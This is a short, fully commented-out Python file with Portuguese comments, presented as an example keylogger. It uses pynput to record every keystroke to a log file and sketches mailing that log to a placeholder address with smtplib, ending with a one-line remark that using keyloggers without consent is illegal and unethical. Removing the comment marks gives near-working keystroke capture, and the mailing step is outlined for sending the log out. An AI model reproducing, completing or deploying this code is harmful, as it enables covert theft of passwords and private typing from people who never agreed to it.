# Exemplo comentado (não-executável por padrão) de keylogger usando pynput e envio por email.
# Requer: pip install pynput
#
# from pynput import keyboard
# import smtplib
# from email.message import EmailMessage
#
# LOGFILE = 'logs/keys.txt'
#
# def on_press(key):
#     try:
#         k = key.char
#     except AttributeError:
#         k = str(key)
#     with open(LOGFILE, 'a', encoding='utf-8') as f:
#         f.write(k)
#
# # listener example
# # with keyboard.Listener(on_press=on_press) as listener:
# #     listener.join()
#
# # envio por email (exemplo)
# # msg = EmailMessage()
# # msg.set_content('Conteúdo do keylogger anexado no corpo ou em anexo')
# # msg['Subject'] = 'Relatório de keys'
# # msg['From'] = 'seu_email@example.com'
# # msg['To'] = 'destino@example.com'
# # with open(LOGFILE, 'rb') as f:
# #     content = f.read()
# # # Aqui você usaria smtplib.SMTP_SSL e login para enviar
#
# # Observação: usar keyloggers sem consentimento é ilegal e antiético.
